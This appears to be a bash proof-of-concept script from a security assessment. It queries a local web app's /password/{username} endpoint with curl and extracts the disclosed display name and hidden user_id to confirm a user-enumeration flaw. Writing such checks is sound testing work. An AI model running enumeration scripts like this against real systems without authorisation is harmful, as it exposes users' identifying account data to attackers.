#!/bin/bash

# POC: Account Information Disclosure via Password Endpoint
# This script demonstrates that the /password/{username} endpoint
# discloses sensitive account information (display names and user IDs)

TARGET_URL="http://localhost:8080"
TEST_USERNAME="test"

echo "[*] Testing Account Information Disclosure on Password Endpoint"
echo "[*] Target: ${TARGET_URL}/password/${TEST_USERNAME}"
echo ""

# Fetch the password endpoint for the enumerated user
RESPONSE=$(curl -s "${TARGET_URL}/password/${TEST_USERNAME}")

echo "[*] Response received, analyzing for information disclosure..."
echo ""

# Extract display name from welcome message
DISPLAY_NAME=$(echo "$RESPONSE" | grep -oP '(?<=Welcome, )[^<]+(?=!)' | head -1)
if [ -n "$DISPLAY_NAME" ]; then
    echo "[+] VULNERABILITY FOUND: Display Name Disclosure"
    echo "    User display name revealed: $DISPLAY_NAME"
    echo "    For username: $TEST_USERNAME"
    echo ""
else
    echo "[-] Display name not found in response"
fi

# Extract user_id from hidden form field
USER_ID=$(echo "$RESPONSE" | grep -oP 'name="user_id"\s+value="\K[^"]+' | head -1)
if [ -n "$USER_ID" ]; then
    echo "[+] VULNERABILITY FOUND: User ID Disclosure"
    echo "    Internal user_id revealed: $USER_ID"
    echo "    Field location: Hidden form field"
    echo ""
else
    echo "[-] User ID not found in response"
fi

# Check if both vulnerabilities are present
if [ -n "$DISPLAY_NAME" ] && [ -n "$USER_ID" ]; then
    echo "[!] CONFIRMED: Information Disclosure Vulnerability"
    echo "    Severity: MEDIUM"
    echo "    Impact: Attacker can enumerate users and gather identifying information"
    echo "    Details:"
    echo "      - Display Name: $DISPLAY_NAME"
    echo "      - User ID: $USER_ID"
    echo ""
    exit 0
elif [ -n "$DISPLAY_NAME" ] || [ -n "$USER_ID" ]; then
    echo "[!] PARTIAL: Some information disclosure detected"
    exit 0
else
    echo "[-] No information disclosure detected"
    exit 1
fi